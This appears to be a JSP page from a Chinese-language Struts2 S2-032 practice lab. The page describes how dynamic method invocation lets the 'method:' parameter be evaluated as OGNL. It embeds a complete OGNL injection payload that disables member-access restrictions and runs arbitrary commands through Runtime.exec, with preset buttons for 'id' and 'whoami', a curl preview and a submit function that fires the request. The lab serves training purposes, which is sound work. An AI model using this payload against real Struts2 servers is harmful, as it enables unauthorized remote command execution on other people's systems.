<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-032 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea, .field input { width: 100%; box-sizing: border-box; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; color: #1d2a35; font: 14px/1.6 Consolas, monospace; }
        .field textarea { min-height: 160px; resize: vertical; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }

    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-032 演示靶场</h1>
        <p>开启动态方法调用后，可以通过 <code>method:</code> 参数让方法名本身参与 OGNL 求值。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('id')">执行 id</button>
            <button type="button" class="preset-btn" onclick="fillPreset('whoami')">执行 whoami</button>
            <button type="button" class="submit-btn" onclick="runPayload()">发送 method Payload</button>
        </div>
        <div class="field">
            <label for="cmdBox">cmd</label>
            <input id="cmdBox" value="id"/>
        </div>
        <div class="field">
            <label for="methodBox">method 参数名中的表达式</label>
            <textarea id="methodBox">#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    const payload = '#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString';
    function strictEncode(value) { return encodeURIComponent(value).replace(/[!'()*]/g, function(char) { return '%' + char.charCodeAt(0).toString(16).toUpperCase(); }); }
    function fillPreset(cmd) { document.getElementById('cmdBox').value = cmd; document.getElementById('methodBox').value = payload; refreshPreview(); }
    function buildUrl() {
        return 'index.action?' + strictEncode('method:' + document.getElementById('methodBox').value) + '=1&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=' + strictEncode(document.getElementById('cmdBox').value);
    }
    function refreshPreview() { document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9955/' + buildUrl() + '"'; }
    function runPayload() { location.href = buildUrl(); }
    document.getElementById('cmdBox').addEventListener('input', refreshPreview); document.getElementById('methodBox').addEventListener('input', refreshPreview); fillPreset('id');
</script>
</body>
</html>
